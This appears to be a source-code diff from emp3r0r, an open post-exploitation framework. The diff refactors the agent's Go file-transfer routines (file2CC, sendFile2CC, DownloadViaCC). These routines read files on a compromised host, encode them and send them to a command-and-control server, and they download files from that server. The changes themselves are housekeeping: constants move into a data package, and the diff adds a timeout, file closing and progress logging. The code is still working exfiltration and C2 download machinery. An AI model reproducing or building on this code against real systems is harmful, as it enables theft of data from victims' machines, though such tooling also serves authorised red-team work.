@@ -14,6 +14,7 @@ import (
 
 	"github.com/cavaliercoder/grab"
 	"github.com/google/uuid"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -36,9 +37,9 @@ func file2CC(filepath string, offset int64) (checksum string, err error) {
 	// base64 encode
 	payload := base64.StdEncoding.EncodeToString(bytes)
 
-	fileData := MsgTunData{
-		Payload: "FILE" + OpSep + filepath + OpSep + payload,
-		Tag:     Tag,
+	fileData := emp3r0r_data.MsgTunData{
+		Payload: "FILE" + emp3r0r_data.OpSep + filepath + emp3r0r_data.OpSep + payload,
+		Tag:     emp3r0r_data.AgentTag,
 	}
 
 	// send
@@ -73,6 +74,7 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 	// return our http client
 	tr := &http.Transport{TLSClientConfig: config}
 	client := grab.NewClient()
+	client.HTTPClient.Timeout = time.Duration(10) * time.Second
 	client.HTTPClient.Transport = tr // use our TLS transport
 
 	req, err := grab.NewRequest(path, url)
@@ -85,12 +87,26 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 		data, err = ioutil.ReadFile(path)
 		return
 	}
-	for resp.Progress() < 1 {
-		log.Printf("%f %% downloaded\n", resp.Progress()*100)
-		time.Sleep(time.Second)
+
+	// progress
+	t := time.NewTicker(time.Second)
+	defer t.Stop()
+	for !resp.IsComplete() {
+		select {
+		case <-resp.Done:
+			err = resp.Err()
+			if err != nil {
+				err = fmt.Errorf("DownloadViaCC finished with error: %v", err)
+				log.Print(err)
+				return
+			}
+			log.Printf("DownloadViaCC: saved %s to %s (%d bytes)", url, path, resp.Size)
+			return
+		case <-t.C:
+			log.Printf("%.02f%% complete\n", resp.Progress()*100)
+		}
 	}
 
-	log.Printf("DownloadViaCC: saved %s to %s (%d bytes)", url, path, resp.Size)
 	return
 }
 
@@ -103,6 +119,8 @@ func sendFile2CC(filepath string, offset int64, token string) (checksum string, 
 		err = fmt.Errorf("sendFile2CC: failed to open %s: %v", filepath, err)
 		return
 	}
+	defer f.Close()
+
 	// seek offset
 	_, err = f.Seek(offset, 0)
 	if err != nil {
@@ -111,7 +129,7 @@ func sendFile2CC(filepath string, offset int64, token string) (checksum string, 
 	}
 
 	// connect
-	url := CCAddress + tun.FTPAPI + "/" + token
+	url := emp3r0r_data.CCAddress + tun.FTPAPI + "/" + token
 	conn, ctx, cancel, err := ConnectCC(url)
 	log.Printf("sendFile2CC: connection: %s", url)
 	if err != nil {
@@ -146,7 +164,7 @@ func sendFile2CC(filepath string, offset int64, token string) (checksum string, 
 		if err != nil {
 			return
 		}
-		buf = buf[:]
+		log.Printf("Sending remaining %d bytes", len(buf))
 	}
 
 	// checksum
